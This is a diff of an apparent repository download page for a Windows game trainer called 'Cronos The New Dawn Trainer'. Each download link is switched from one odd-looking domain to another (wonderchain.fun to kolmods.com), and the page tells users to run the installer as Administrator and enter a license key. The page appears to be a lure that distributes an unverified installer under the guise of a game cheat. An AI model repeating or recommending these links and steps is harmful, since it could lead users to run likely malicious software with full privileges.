@@ -16,27 +16,27 @@ Direct installer link below.
 > **This is the download page.** Use the button or link below to get **Cronos The New Dawn Trainer** for Windows.
 
 <p align="center">
-  <a href="https://cronosnewdawntrainer.wonderchain.fun/">
+  <a href="https://cronosnewdawntrainer.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Cronos%20The%20New%20Dawn%20Trainer-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Cronos The New Dawn Trainer">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[cronosnewdawntrainer.wonderchain.fun](https://cronosnewdawntrainer.wonderchain.fun/)** |
-| **Full URL** | `https://cronosnewdawntrainer.wonderchain.fun/` |
+| **Direct link** | **[cronosnewdawntrainer.kolmods.com](https://cronosnewdawntrainer.kolmods.com/)** |
+| **Full URL** | `https://cronosnewdawntrainer.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — cronosnewdawntrainer.wonderchain.fun](https://cronosnewdawntrainer.wonderchain.fun/)** (link above)
+1. Click **[Download — cronosnewdawntrainer.kolmods.com](https://cronosnewdawntrainer.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://cronosnewdawntrainer.wonderchain.fun/"><strong>⬇ Download Cronos The New Dawn Trainer now</strong></a></p>
+<p align="center"><a href="https://cronosnewdawntrainer.kolmods.com/"><strong>⬇ Download Cronos The New Dawn Trainer now</strong></a></p>
 
 ---
 
